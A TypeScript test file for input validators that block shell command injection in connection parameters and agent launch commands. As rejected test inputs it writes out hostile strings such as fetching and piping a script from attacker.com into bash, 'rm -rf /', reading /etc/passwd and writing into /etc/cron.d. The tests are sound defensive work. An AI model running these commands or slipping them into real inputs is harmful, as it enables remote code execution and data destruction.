/**
 * Tests for connection parameter validation (security-critical)
 * These functions prevent command injection via corrupted history files
 */

import { describe, expect, it } from "bun:test";
import {
  validateConnectionIP,
  validateLaunchCmd,
  validateMetadataValue,
  validatePreLaunchCmd,
  validateServerIdentifier,
  validateUsername,
} from "../security.js";

describe("validateConnectionIP", () => {
  describe("valid inputs", () => {
    it("should accept valid IPv4 addresses", () => {
      expect(() => validateConnectionIP("192.168.1.1")).not.toThrow();
      expect(() => validateConnectionIP("10.0.0.1")).not.toThrow();
      expect(() => validateConnectionIP("8.8.8.8")).not.toThrow();
      expect(() => validateConnectionIP("255.255.255.255")).not.toThrow();
    });

    it("should accept valid IPv6 addresses", () => {
      expect(() => validateConnectionIP("::1")).not.toThrow();
      expect(() => validateConnectionIP("2001:db8::1")).not.toThrow();
      expect(() => validateConnectionIP("fe80::1")).not.toThrow();
      expect(() => validateConnectionIP("2001:0db8:0000:0000:0000:ff00:0042:8329")).not.toThrow();
    });

    it("should accept special sentinel values", () => {
      expect(() => validateConnectionIP("sprite-console")).not.toThrow();
      expect(() => validateConnectionIP("localhost")).not.toThrow();
    });

    it("should accept valid hostnames", () => {
      expect(() => validateConnectionIP("example.com")).not.toThrow();
      expect(() => validateConnectionIP("sub.domain.example.com")).not.toThrow();
    });
  });

  describe("invalid inputs", () => {
    it("should reject empty strings", () => {
      expect(() => validateConnectionIP("")).toThrow(/required but was empty/);
      expect(() => validateConnectionIP("   ")).toThrow(/required but was empty/);
    });

    it("should reject shell metacharacters", () => {
      expect(() => validateConnectionIP("8.8.8.8; rm -rf /")).toThrow(/Invalid connection IP/);
      expect(() => validateConnectionIP("$(whoami)")).toThrow(/Invalid connection IP/);
      expect(() => validateConnectionIP("`id`")).toThrow(/Invalid connection IP/);
      expect(() => validateConnectionIP("8.8.8.8 | malicious")).toThrow(/Invalid connection IP/);
    });

    it("should reject invalid IP formats", () => {
      expect(() => validateConnectionIP("not-an-ip")).toThrow(/Invalid connection IP/);
      expect(() => validateConnectionIP("256.256.256.256")).toThrow(/Invalid connection IP/);
    });

    it("should reject hostnames with shell metacharacters", () => {
      expect(() => validateConnectionIP("host.com; rm -rf /")).toThrow(/Invalid connection IP/);
      expect(() => validateConnectionIP("$(evil).com")).toThrow(/Invalid connection IP/);
    });

    it("should reject path-like values", () => {
      expect(() => validateConnectionIP("/etc/passwd")).toThrow(/Invalid connection IP/);
      expect(() => validateConnectionIP("../../etc/passwd")).toThrow(/Invalid connection IP/);
    });
  });
});

describe("validateUsername", () => {
  describe("valid inputs", () => {
    it("should accept common usernames", () => {
      expect(() => validateUsername("root")).not.toThrow();
      expect(() => validateUsername("ubuntu")).not.toThrow();
      expect(() => validateUsername("admin")).not.toThrow();
      expect(() => validateUsername("user-123")).not.toThrow();
      expect(() => validateUsername("_system")).not.toThrow();
      expect(() => validateUsername("deploy_bot")).not.toThrow();
    });

    it("should accept usernames with $ suffix (system accounts)", () => {
      expect(() => validateUsername("postgres$")).not.toThrow();
      expect(() => validateUsername("mysql$")).not.toThrow();
    });
  });

  describe("invalid inputs", () => {
    it("should reject empty strings", () => {
      expect(() => validateUsername("")).toThrow(/required but was empty/);
      expect(() => validateUsername("   ")).toThrow(/required but was empty/);
    });

    it("should reject usernames that are too long", () => {
      const longName = "a".repeat(33);
      expect(() => validateUsername(longName)).toThrow(/too long/);
    });

    it("should reject shell metacharacters", () => {
      expect(() => validateUsername("root; whoami")).toThrow(/Invalid username/);
      expect(() => validateUsername("$(whoami)")).toThrow(/Invalid username/);
      expect(() => validateUsername("user`id`")).toThrow(/Invalid username/);
      expect(() => validateUsername("admin|malicious")).toThrow(/Invalid username/);
    });

    it("should reject uppercase letters", () => {
      expect(() => validateUsername("Root")).toThrow(/Invalid username/);
      expect(() => validateUsername("ADMIN")).toThrow(/Invalid username/);
    });

    it("should reject usernames starting with digits", () => {
      expect(() => validateUsername("123user")).toThrow(/Invalid username/);
    });

    it("should reject special characters", () => {
      expect(() => validateUsername("user@host")).toThrow(/Invalid username/);
      expect(() => validateUsername("user.name")).toThrow(/Invalid username/);
      expect(() => validateUsername("user:group")).toThrow(/Invalid username/);
    });
  });
});

describe("validateServerIdentifier", () => {
  describe("valid inputs", () => {
    it("should accept common server identifiers", () => {
      expect(() => validateServerIdentifier("server-123")).not.toThrow();
      expect(() => validateServerIdentifier("i-0abcd1234efgh5678")).not.toThrow();
      expect(() => validateServerIdentifier("my-vm.example")).not.toThrow();
      expect(() => validateServerIdentifier("hetzner_12345")).not.toThrow();
      expect(() => validateServerIdentifier("test.server.local")).not.toThrow();
    });

    it("should accept mixed case identifiers", () => {
      expect(() => validateServerIdentifier("MyServer-123")).not.toThrow();
      expect(() => validateServerIdentifier("i-ABC123")).not.toThrow();
    });

    it("should accept identifiers with dots and underscores", () => {
      expect(() => validateServerIdentifier("server.example.com")).not.toThrow();
      expect(() => validateServerIdentifier("my_server_123")).not.toThrow();
      expect(() => validateServerIdentifier("test-vm.local")).not.toThrow();
    });
  });

  describe("invalid inputs", () => {
    it("should reject empty strings", () => {
      expect(() => validateServerIdentifier("")).toThrow(/required but was empty/);
      expect(() => validateServerIdentifier("   ")).toThrow(/required but was empty/);
    });

    it("should reject identifiers that are too long", () => {
      const longId = "a".repeat(129);
      expect(() => validateServerIdentifier(longId)).toThrow(/too long/);
    });

    it("should reject shell metacharacters", () => {
      expect(() => validateServerIdentifier("server; rm -rf /")).toThrow(/Invalid server identifier/);
      expect(() => validateServerIdentifier("$(whoami)")).toThrow(/Invalid server identifier/);
      expect(() => validateServerIdentifier("server`id`")).toThrow(/Invalid server identifier/);
      expect(() => validateServerIdentifier("vm|malicious")).toThrow(/Invalid server identifier/);
      expect(() => validateServerIdentifier("test & echo pwned")).toThrow(/Invalid server identifier/);
    });

    it("should reject path traversal patterns", () => {
      expect(() => validateServerIdentifier("../../../etc/passwd")).toThrow(/path-like patterns/);
      expect(() => validateServerIdentifier("server/../malicious")).toThrow(/path-like patterns/);
      expect(() => validateServerIdentifier("/etc/passwd")).toThrow(/path-like patterns/);
      expect(() => validateServerIdentifier("\\windows\\system32")).toThrow(/path-like patterns/);
    });

    it("should reject spaces and special characters", () => {
      expect(() => validateServerIdentifier("server name")).toThrow(/Invalid server identifier/);
      expect(() => validateServerIdentifier("server@host")).toThrow(/Invalid server identifier/);
      expect(() => validateServerIdentifier("server:port")).toThrow(/Invalid server identifier/);
      expect(() => validateServerIdentifier("server#123")).toThrow(/Invalid server identifier/);
    });
  });
});

describe("validateLaunchCmd", () => {
  describe("valid inputs — real commands from agent-setup.ts (issue #2052 regression)", () => {
    it("should accept claude launch command with PATH setup", () => {
      expect(() =>
        validateLaunchCmd(
          "source ~/.spawnrc 2>/dev/null; export PATH=$HOME/.claude/local/bin:$HOME/.local/bin:$HOME/.bun/bin:$PATH; claude",
        ),
      ).not.toThrow();
    });

    it("should accept codex launch command", () => {
      expect(() =>
        validateLaunchCmd("source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; codex"),
      ).not.toThrow();
    });

    it("should accept openclaw launch command with PATH setup", () => {
      expect(() =>
        validateLaunchCmd(
          "source ~/.spawnrc 2>/dev/null; export PATH=$HOME/.npm-global/bin:$HOME/.bun/bin:$HOME/.local/bin:$PATH; openclaw tui",
        ),
      ).not.toThrow();
    });

    it("should accept opencode launch command", () => {
      expect(() =>
        validateLaunchCmd("source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; opencode"),
      ).not.toThrow();
    });

    it("should accept kilocode launch command", () => {
      expect(() =>
        validateLaunchCmd("source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; kilocode"),
      ).not.toThrow();
    });

    it("should accept zeroclaw launch command with cargo env and PATH", () => {
      expect(() =>
        validateLaunchCmd(
          "export PATH=$HOME/.cargo/bin:$PATH; source ~/.cargo/env 2>/dev/null; source ~/.spawnrc 2>/dev/null; zeroclaw agent",
        ),
      ).not.toThrow();
    });

    it("should accept hermes launch command", () => {
      expect(() => validateLaunchCmd("source ~/.spawnrc 2>/dev/null; hermes")).not.toThrow();
    });

    it("should accept a simple binary with no preamble", () => {
      expect(() => validateLaunchCmd("claude")).not.toThrow();
      expect(() => validateLaunchCmd("aider")).not.toThrow();
    });

    it("should accept empty/blank commands (caller falls back to manifest)", () => {
      expect(() => validateLaunchCmd("")).not.toThrow();
      expect(() => validateLaunchCmd("   ")).not.toThrow();
    });
  });

  describe("invalid inputs — injection attempts", () => {
    it("should reject command substitution $()", () => {
      expect(() => validateLaunchCmd("$(whoami)")).toThrow(/Invalid launch command/);
      expect(() => validateLaunchCmd("source ~/.spawnrc 2>/dev/null; $(curl attacker.com | bash)")).toThrow(
        /Invalid launch command/,
      );
    });

    it("should reject backtick command substitution", () => {
      expect(() => validateLaunchCmd("`id`")).toThrow(/Invalid launch command/);
    });

    it("should reject pipe operators", () => {
      expect(() => validateLaunchCmd("claude | cat /etc/passwd")).toThrow(/Invalid launch command/);
    });

    it("should reject && chaining", () => {
      expect(() => validateLaunchCmd("claude && curl attacker.com")).toThrow(/Invalid launch command/);
    });

    it("should reject || chaining", () => {
      expect(() => validateLaunchCmd("false || curl attacker.com")).toThrow(/Invalid launch command/);
    });

    it("should reject arbitrary commands in preamble", () => {
      expect(() => validateLaunchCmd("curl attacker.com; claude")).toThrow(/Invalid launch command/);
      expect(() => validateLaunchCmd("rm -rf /; claude")).toThrow(/Invalid launch command/);
    });

    it("should reject redirection to arbitrary paths in preamble", () => {
      expect(() => validateLaunchCmd("cat /etc/passwd > /tmp/out; claude")).toThrow(/Invalid launch command/);
    });

    it("should reject commands that are too long", () => {
      const longCmd = "claude " + "a".repeat(1020);
      expect(() => validateLaunchCmd(longCmd)).toThrow(/too long/);
    });

    it("should reject uppercase binary names (not in agent-setup.ts)", () => {
      expect(() => validateLaunchCmd("Claude")).toThrow(/Invalid launch command/);
    });
  });
});

describe("validatePreLaunchCmd", () => {
  describe("valid inputs — background daemon patterns", () => {
    it("should accept openclaw gateway pre_launch from manifest (#2474)", () => {
      expect(() => validatePreLaunchCmd("nohup openclaw gateway > /tmp/openclaw-gateway.log 2>&1 &")).not.toThrow();
    });

    it("should accept nohup with simple binary and backgrounding", () => {
      expect(() => validatePreLaunchCmd("nohup myagent server &")).not.toThrow();
    });

    it("should accept binary with redirect and backgrounding (no nohup)", () => {
      expect(() => validatePreLaunchCmd("myagent server > /tmp/myagent.log 2>&1 &")).not.toThrow();
    });

    it("should accept simple backgrounded command", () => {
      expect(() => validatePreLaunchCmd("myagent daemon &")).not.toThrow();
    });

    it("should accept nohup with append redirect", () => {
      expect(() => validatePreLaunchCmd("nohup openclaw gateway >> /tmp/openclaw-gateway.log 2>&1 &")).not.toThrow();
    });

    it("should accept redirect without stderr merge", () => {
      expect(() => validatePreLaunchCmd("nohup openclaw gateway > /tmp/openclaw.log &")).not.toThrow();
    });

    it("should accept empty/blank commands", () => {
      expect(() => validatePreLaunchCmd("")).not.toThrow();
      expect(() => validatePreLaunchCmd("   ")).not.toThrow();
    });
  });

  describe("invalid inputs — injection attempts", () => {
    it("should reject command substitution $()", () => {
      expect(() => validatePreLaunchCmd("$(whoami) &")).toThrow(/Invalid pre_launch/);
    });

    it("should reject backtick command substitution", () => {
      expect(() => validatePreLaunchCmd("`id` &")).toThrow(/Invalid pre_launch/);
    });

    it("should reject pipe operators", () => {
      expect(() => validatePreLaunchCmd("nohup agent | tee /tmp/log &")).toThrow(/Invalid pre_launch/);
    });

    it("should reject redirect to non-tmp paths", () => {
      expect(() => validatePreLaunchCmd("nohup agent > /etc/cron.d/evil 2>&1 &")).toThrow(/Invalid pre_launch/);
    });

    it("should reject commands without backgrounding (&)", () => {
      expect(() => validatePreLaunchCmd("nohup openclaw gateway > /tmp/openclaw.log 2>&1")).toThrow(
        /Invalid pre_launch/,
      );
    });

    it("should reject commands that are too long", () => {
      const longCmd = "nohup agent " + "a".repeat(1015) + " &";
      expect(() => validatePreLaunchCmd(longCmd)).toThrow(/too long/);
    });

    it("should reject semicolon chaining", () => {
      expect(() => validatePreLaunchCmd("curl evil.com; nohup agent &")).toThrow(/Invalid pre_launch/);
    });

    it("should reject && chaining", () => {
      expect(() => validatePreLaunchCmd("curl evil.com && nohup agent &")).toThrow(/Invalid pre_launch/);
    });
  });
});

describe("validateMetadataValue", () => {
  describe("valid inputs", () => {
    it("should accept valid GCP zones", () => {
      expect(() => validateMetadataValue("us-central1-a", "zone")).not.toThrow();
      expect(() => validateMetadataValue("europe-west1-b", "zone")).not.toThrow();
      expect(() => validateMetadataValue("asia-east1-c", "zone")).not.toThrow();
    });

    it("should accept valid project IDs", () => {
      expect(() => validateMetadataValue("my-project-123", "project")).not.toThrow();
      expect(() => validateMetadataValue("gcp_project.name", "project")).not.toThrow();
      expect(() => validateMetadataValue("prod-app-42", "project")).not.toThrow();
    });

    it("should accept alphanumeric values with allowed special characters", () => {
      expect(() => validateMetadataValue("simple", "field")).not.toThrow();
      expect(() => validateMetadataValue("with.dots", "field")).not.toThrow();
      expect(() => validateMetadataValue("with_underscores", "field")).not.toThrow();
      expect(() => validateMetadataValue("with-hyphens", "field")).not.toThrow();
      expect(() => validateMetadataValue("MixedCase123", "field")).not.toThrow();
    });

    it("should allow empty string (caller provides defaults)", () => {
      expect(() => validateMetadataValue("", "zone")).not.toThrow();
    });

    it("should allow whitespace-only string (treated as empty)", () => {
      expect(() => validateMetadataValue("   ", "project")).not.toThrow();
    });
  });

  describe("invalid inputs", () => {
    it("should reject values exceeding 128 characters", () => {
      const longValue = "a".repeat(129);
      expect(() => validateMetadataValue(longValue, "zone")).toThrow(/too long/);
    });

    it("should accept values at exactly 128 characters", () => {
      const exactValue = "a".repeat(128);
      expect(() => validateMetadataValue(exactValue, "zone")).not.toThrow();
    });

    it("should reject command substitution with $()", () => {
      expect(() => validateMetadataValue("$(whoami)", "zone")).toThrow(/Invalid zone/);
    });

    it("should reject backtick command substitution", () => {
      expect(() => validateMetadataValue("`id`", "project")).toThrow(/Invalid project/);
    });

    it("should reject semicolon injection", () => {
      expect(() => validateMetadataValue("zone;rm -rf /", "zone")).toThrow(/Invalid zone/);
    });

    it("should reject pipe injection", () => {
      expect(() => validateMetadataValue("zone|cat /etc/passwd", "project")).toThrow(/Invalid project/);
    });

    it("should reject ampersand chaining", () => {
      expect(() => validateMetadataValue("zone&echo pwned", "zone")).toThrow(/Invalid zone/);
    });

    it("should reject path traversal", () => {
      expect(() => validateMetadataValue("../../../etc/passwd", "zone")).toThrow(/Invalid zone/);
    });

    it("should reject spaces", () => {
      expect(() => validateMetadataValue("us central1", "zone")).toThrow(/Invalid zone/);
    });

    it("should reject quotes", () => {
      expect(() => validateMetadataValue("zone'injection", "field")).toThrow(/Invalid field/);
      expect(() => validateMetadataValue('zone"injection', "field")).toThrow(/Invalid field/);
    });

    it("should include field name in error messages", () => {
      expect(() => validateMetadataValue("$(evil)", "gcp_zone")).toThrow(/Invalid gcp_zone/);
      expect(() => validateMetadataValue("bad;value", "gcp_project")).toThrow(/Invalid gcp_project/);
      expect(() => validateMetadataValue("a".repeat(129), "my_field")).toThrow(/my_field is too long/);
    });
  });
});
